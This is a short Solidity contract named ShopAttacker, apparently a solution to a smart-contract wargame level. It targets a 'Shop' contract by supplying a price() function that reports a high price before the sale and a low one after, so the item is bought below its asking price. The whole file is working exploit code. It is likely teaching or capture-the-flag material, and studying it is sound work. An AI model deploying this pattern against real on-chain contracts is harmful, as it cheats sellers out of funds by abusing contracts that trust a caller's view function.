// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
    function isSold() external view returns (bool);
    function buy() external;
}

contract ShopAttacker {
    uint256 lowPrice = 1;
    uint256 highPrice = 120;
    IShop shop;

    constructor(address _victimShopAddr) {
        shop = IShop(_victimShopAddr);
    }

    function buyFromShop() external {
        if (shop.isSold() == false) {
            shop.buy();
        }
    }

    function price() external view returns (uint256) {
        if (shop.isSold() == true) {
            return lowPrice;
        } else {
            return highPrice;
        }
    }
}
